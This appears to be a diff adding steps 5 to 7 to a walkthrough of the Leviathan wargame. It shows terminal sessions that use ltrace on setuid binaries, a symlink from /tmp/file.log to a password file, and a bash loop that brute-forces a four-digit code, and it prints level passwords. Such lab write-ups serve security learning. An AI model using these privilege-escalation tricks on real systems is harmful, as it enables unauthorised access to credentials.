@@ -137,5 +137,81 @@ vuH0coox6m
 
 5. 
 
+```
+leviathan4@leviathan:~$ ls -lrht -a
+total 24K
+-rw-r--r--  1 root root        675 May 15  2017 .profile
+-rw-r--r--  1 root root       3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
+drwxr-xr-x 10 root root       4.0K Aug 26 22:26 ..
+drwxr-xr-x  3 root root       4.0K Aug 26 22:26 .
+dr-xr-x---  2 root leviathan4 4.0K Aug 26 22:26 .trash
+leviathan4@leviathan:~/.trash$ ls -lrht -a
+total 16K
+drwxr-xr-x 3 root       root       4.0K Aug 26 22:26 ..
+-r-sr-x--- 1 leviathan5 leviathan4 7.2K Aug 26 22:26 bin
+dr-xr-x--- 2 root       leviathan4 4.0K Aug 26 22:26 .
+leviathan4@leviathan:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+leviathan4@leviathan:~/.trash$ ltrace ./bin 
+__libc_start_main(0x80484bb, 1, 0xffffd684, 0x80485b0 <unfinished ...>
+fopen("/etc/leviathan_pass/leviathan5", "r")     = 0
++++ exited (status 255) +++
+
+Tith4cokei
+```
+
+6. 
+
+```
+leviathan5@leviathan:~$ ls -lrht -a
+total 28K
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+drwxr-xr-x 10 root       root       4.0K Aug 26 22:26 ..
+-r-sr-x---  1 leviathan6 leviathan5 7.4K Aug 26 22:26 leviathan5
+drwxr-xr-x  2 root       root       4.0K Aug 26 22:26 .
+leviathan5@leviathan:~$ ./leviathan5 
+Cannot find /tmp/file.log
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5 
+UgaoFee4li
+```
+
+7. 
+
+```
+leviathan6@leviathan:~$ ls -lrht -a
+total 28K
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+drwxr-xr-x 10 root       root       4.0K Aug 26 22:26 ..
+-r-sr-x---  1 leviathan7 leviathan6 7.3K Aug 26 22:26 leviathan6
+drwxr-xr-x  2 root       root       4.0K Aug 26 22:26 .
+leviathan6@leviathan:~$ ./leviathan6 
+usage: ./leviathan6 <4 digit code>
+leviathan6@leviathan:~$ ltrace ./leviathan6 1234
+__libc_start_main(0x804853b, 2, 0xffffd684, 0x80485e0 <unfinished ...>
+atoi(0xffffd7dc, 0, 0xf7e40890, 0x804862b)                    = 1234
+puts("Wrong"Wrong
+)                                                 = 6
++++ exited (status 0) +++
+
+//bash
+#!/bin/bash
+
+for a in {0000..9999}
+do
+~/leviathan6 $a
+done
+
+$ whoami 
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+
 [back](/)
 
